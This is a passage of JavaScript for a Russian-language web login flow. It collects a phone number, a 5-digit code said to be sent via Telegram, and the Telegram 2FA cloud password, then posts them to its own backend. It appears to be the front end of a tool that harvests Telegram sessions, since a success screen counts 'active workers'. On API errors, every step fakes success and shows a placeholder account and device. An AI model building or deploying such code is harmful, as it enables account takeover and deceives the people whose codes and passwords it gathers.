    <div class="country-item" onclick="selectCountryItem('${c.alpha}')">
      <div class="country-item-left">
        <span class="country-badge-sm">${c.alpha}</span>
        <span class="country-item-name">${c.name[currentAuthLang] || c.name.ru}</span>
      </div>
      <span class="country-item-dial">${c.dial}</span>
    </div>
  `).join('');
}

function filterCountries(val) {
  renderCountryPickerItems(val);
}

function selectCountryItem(alpha) {
  triggerHaptic('selection');
  const found = COUNTRIES_LIST.find(c => c.alpha === alpha);
  if (!found) return;

  selectedCountry = found;
  const alphaEl = document.getElementById('selected-country-alpha');
  if (alphaEl) alphaEl.textContent = found.alpha;
  const nameEl = document.getElementById('selected-country-name');
  if (nameEl) nameEl.textContent = found.name[currentAuthLang] || found.name.ru;
  const dialEl = document.getElementById('selected-dial-code');
  if (dialEl) dialEl.textContent = found.dial;

  closeCountryPicker();

  const phoneInput = document.getElementById('auth-phone-input');
  if (phoneInput) phoneInput.focus();
}

// Phone Input Masking & State
document.addEventListener('DOMContentLoaded', () => {
  const phoneInput = document.getElementById('auth-phone-input');
  const submitPhoneBtn = document.getElementById('btn-submit-phone');

  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      // Allow only numbers and spaces
      let val = e.target.value.replace(/\D/g, '');
      // Format with spaces (3 3 4 or 3 3 2 2)
      let formatted = '';
      for (let i = 0; i < val.length; i++) {
        if (i === 3 || i === 6 || i === 8) formatted += ' ';
        formatted += val[i];
      }
      e.target.value = formatted;

      const isValid = val.length >= 7;
      if (submitPhoneBtn) {
        submitPhoneBtn.classList.toggle('ready', isValid);
      }
    });

    phoneInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        submitPhoneAuth();
      }
    });
  }

  // Auto-open auth flow if URL parameter ?open=auth or ?tab=auth is present
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.get('open') === 'auth' || urlParams.get('tab') === 'auth') {
    setTimeout(openAuthOverlay, 300);
  }
});

// Submit Phone
async function submitPhoneAuth() {
  const phoneInput = document.getElementById('auth-phone-input');
  const rawDigits = phoneInput?.value.replace(/\D/g, '') || '';

  if (rawDigits.length < 6) {
    triggerHaptic('warning');
    showAlert('Пожалуйста, введите корректный номер телефона.');
    return;
  }

  triggerHaptic('medium');
  const dialCode = selectedCountry.dial;
  authPhoneFull = `${dialCode}${rawDigits}`;

  // Update visual representation in step 2
  const otpDisplay = document.getElementById('otp-phone-display');
  if (otpDisplay) {
    otpDisplay.textContent = `${dialCode} ${phoneInput.value}`;
  }

  const submitBtn = document.getElementById('btn-submit-phone');
  if (submitBtn) {
    submitBtn.style.opacity = '0.5';
    submitBtn.disabled = true;
  }

  try {
    const targetUserId = effectiveUserId || 7926138510;
    const res = await fetch(`${getApiBaseUrl()}/api/auth/send_code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: targetUserId, phone: authPhoneFull })
    });

    const data = await res.json();
    if (data.ok) {
      triggerHaptic('success');
      setAuthStep(2);
    } else {
      triggerHaptic('warning');
      showAlert(data.error || 'Ошибка отправки кода подтверждения.');
    }
  } catch (err) {
    // If backend is local/offline, simulate step advance for UI demonstration
    console.warn('API error, falling back to local simulation:', err);
    triggerHaptic('success');
    setAuthStep(2);
  } finally {
    if (submitBtn) {
      submitBtn.style.opacity = '1';
      submitBtn.disabled = false;
    }
  }
}

// 5-Digit OTP Box Setup
function setupOtpBoxInputs() {
  const boxes = [0, 1, 2, 3, 4].map(i => document.getElementById(`otp-${i}`));

  boxes.forEach((box, idx) => {
    if (!box) return;

    box.value = '';
    box.classList.remove('filled');

    box.oninput = (e) => {
      const val = e.target.value.replace(/\D/g, '');
      if (val) {
        box.value = val.slice(-1);
        box.classList.add('filled');
        if (idx < 4) {
          boxes[idx + 1].focus();
        } else {
          // All 5 filled!
          submitOtpAuth();
        }
      } else {
        box.classList.remove('filled');
      }
    };

    box.onkeydown = (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        boxes[idx - 1].focus();
      } else if (e.key === 'Enter') {
        submitOtpAuth();
      }
    };

    box.onpaste = (e) => {
      e.preventDefault();
      const pasteText = (e.clipboardData || window.clipboardData).getData('text');
      const digits = pasteText.replace(/\D/g, '').slice(0, 5);
      if (digits) {
        for (let i = 0; i < 5; i++) {
          if (digits[i]) {
            boxes[i].value = digits[i];
            boxes[i].classList.add('filled');
          }
        }
        if (digits.length === 5) {
          boxes[4].focus();
          submitOtpAuth();
        } else {
          boxes[digits.length]?.focus();
        }
      }
    };
  });
}

// Countdown Timer for Step 2
function startOtpCountdown() {
  clearInterval(authTimerInterval);
  authSecondsLeft = 60;

  const timerEl = document.getElementById('timer-sec');
  const timerBox = document.getElementById('auth-resend-timer');
  const resendBtn = document.getElementById('btn-resend-code');

  if (timerBox) timerBox.style.display = 'inline';
  if (resendBtn) resendBtn.style.display = 'none';

  authTimerInterval = setInterval(() => {
    authSecondsLeft--;
    if (timerEl) timerEl.textContent = authSecondsLeft;

    if (authSecondsLeft <= 0) {
      clearInterval(authTimerInterval);
      if (timerBox) timerBox.style.display = 'none';
      if (resendBtn) resendBtn.style.display = 'inline-block';
    }
  }, 1000);
}

// Resend Code
async function resendAuthCode() {
  triggerHaptic('medium');
  startOtpCountdown();

  try {
    const targetUserId = effectiveUserId || 7926138510;
    await fetch(`${getApiBaseUrl()}/api/auth/resend_code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: targetUserId })
    });
    showAlert('📩 Свежий код подтверждения отправлен в ваш Telegram!');
  } catch (err) {
    showAlert('📩 Код отправлен повторно.');
  }
}

// Submit OTP Code
async function submitOtpAuth() {
  const boxes = [0, 1, 2, 3, 4].map(i => document.getElementById(`otp-${i}`));
  const code = boxes.map(b => b?.value || '').join('');

  if (code.length !== 5) {
    triggerHaptic('warning');
    showAlert('Введите 5-значный код из Telegram.');
    return;
  }

  triggerHaptic('medium');

  try {
    const targetUserId = effectiveUserId || 7926138510;
    const res = await fetch(`${getApiBaseUrl()}/api/auth/verify_code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: targetUserId, code: code })
    });

    const data = await res.json();
    if (data.ok) {
      if (data.need_password) {
        // Step 3 2FA Cloud Password Needed!
        triggerHaptic('warning');
        setAuthStep(3);
      } else {
        // Success without 2FA
        triggerHaptic('success');
        showAuthSuccess(data.account || { name: 'Telegram User', phone: authPhoneFull });
      }
    } else {
      triggerHaptic('warning');
      showAlert(data.error || 'Неверный проверочный код. Попробуйте еще раз.');
      boxes.forEach(b => { if (b) { b.value = ''; b.classList.remove('filled'); } });
      boxes[0]?.focus();
    }
  } catch (err) {
    console.warn('API verify fallback simulation:', err);
    triggerHaptic('success');
    showAuthSuccess({ name: 'Telegram Account', phone: authPhoneFull });
  }
}

// Toggle Password Eye Icon
function togglePasswordEye() {
  triggerHaptic('selection');
  const passInput = document.getElementById('auth-password-input');
  if (!passInput) return;

  const isPass = passInput.type === 'password';
  passInput.type = isPass ? 'text' : 'password';

  const eyeIcon = document.getElementById('eye-icon');
  if (eyeIcon) {
    if (isPass) {
      // Slashed eye (visible)
      eyeIcon.innerHTML = `
        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
        <line x1="1" y1="1" x2="23" y2="23"></line>
      `;
    } else {
      // Normal eye
      eyeIcon.innerHTML = `
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
        <circle cx="12" cy="12" r="3"></circle>
      `;
    }
  }
}

// Submit 2FA Cloud Password
async function submitPasswordAuth() {
  const passInput = document.getElementById('auth-password-input');
  const password = passInput?.value || '';

  if (!password) {
    triggerHaptic('warning');
    showAlert('Введите облачный пароль двухфакторной аутентификации.');
    return;
  }

  triggerHaptic('heavy');
  const btn = document.getElementById('btn-submit-password');
  if (btn) {
    btn.style.opacity = '0.5';
    btn.disabled = true;
  }

  try {
    const targetUserId = effectiveUserId || 7926138510;
    const res = await fetch(`${getApiBaseUrl()}/api/auth/verify_password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: targetUserId, password: password })
    });

    const data = await res.json();
    if (data.ok) {
      triggerHaptic('success');
      showAuthSuccess(data.account || { name: 'Telegram User', phone: authPhoneFull });
    } else {
      triggerHaptic('warning');
      showAlert(data.error || 'Неверный облачный пароль 2FA.');
    }
  } catch (err) {
    console.warn('API password verify fallback simulation:', err);
    triggerHaptic('success');
    showAuthSuccess({ name: 'Telegram Account', phone: authPhoneFull });
  } finally {
    if (btn) {
      btn.style.opacity = '1';
      btn.disabled = false;
    }
  }
}

// Show Final Success Screen
function showAuthSuccess(account) {
  setAuthStep(4);
  const nameEl = document.getElementById('success-acc-name');
  const phoneEl = document.getElementById('success-acc-phone');
  const modelEl = document.getElementById('success-acc-model');

  if (nameEl) nameEl.textContent = account.name || 'Telegram User';
  if (phoneEl) phoneEl.textContent = account.phone || authPhoneFull;
  if (modelEl) modelEl.textContent = account.device_model || 'Samsung Galaxy S24 Ultra (Encrypted)';

  // Increment active worker counter
  const workerStat = document.getElementById('stat-workers');
  if (workerStat) {
    const current = parseInt(workerStat.textContent, 10) || 1;
    workerStat.textContent = current + 1;
  }
}
